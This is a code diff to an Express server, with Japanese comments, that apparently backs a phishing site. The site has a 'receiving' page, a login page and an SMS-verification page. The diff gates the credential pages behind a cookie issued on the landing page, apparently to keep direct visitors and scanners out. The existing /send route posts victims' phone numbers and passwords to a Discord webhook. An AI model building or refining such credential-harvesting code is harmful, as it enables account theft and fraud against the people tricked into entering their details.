@@ -1,11 +1,61 @@
 const express = require("express");
 const app = express();
+const cookieParser = require("cookie-parser");
 const { getAccessLog } = require("./dist/Access");
 
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static("."));
+app.use(cookieParser()); // Cookieパーサーを追加
 
 const webhook = process.env.DISCORD_WEBHOOK;
+
+// 1. index.html（受け取り画面）へのアクセス時のみCookieを発行
+app.get(["/", "/index.html"], (req, res, next) => {
+  // 最初のアクセスでCookieを付与
+  if (!req.cookies.pp_session) {
+    res.cookie("pp_session", "1", { httpOnly: true, secure: true, path: "/" });
+  }
+  next(); // express.staticに処理を渡す
+});
+
+// 2. login.html（ログイン画面）へのアクセス制限
+app.get("/login.html", (req, res, next) => {
+  if (req.cookies.pp_session !== "1") {
+    return res.status(403).send(`
+      <!DOCTYPE html>
+      <html lang="ja">
+      <head><meta charset="UTF-8"><title>403 Forbidden</title></head>
+      <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f7f7f7;">
+        <h1 style="color:#333;">403 Forbidden</h1>
+        <p style="color:#666;">不正なアクセスです。最初からやり直してください。</p>
+      </body>
+      </html>
+    `);
+  }
+  next();
+});
+
+// 3. sms.html（SMS認証画面）へのアクセス制限
+app.get("/sms.html", (req, res, next) => {
+  if (req.cookies.pp_session !== "1") {
+    return res.status(403).send(`
+      <!DOCTYPE html>
+      <html lang="ja">
+      <head><meta charset="UTF-8"><title>403 Forbidden</title></head>
+      <body style="text-align:center; padding:50px; font-family:sans-serif; background:#f7f7f7;">
+        <h1 style="color:#333;">403 Forbidden</h1>
+        <p style="color:#666;">不正なアクセスです。最初からやり直してください。</p>
+      </body>
+      </html>
+    `);
+  }
+  next();
+});
+
+// 4. その他の静的ファイルの配信（既存の位置を維持）
+app.use(express.static("."));
+
+
+// --- APIルーティング ---
 
 app.post("/send", async (req, res) => {
   const phone = req.body.name;
@@ -29,7 +79,6 @@ app.post("/send", async (req, res) => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        // passwordではなくsafePasswordを使用
         content: `\ntel: ${cleanPhone}\npass: ${safePassword}`
       })
     });
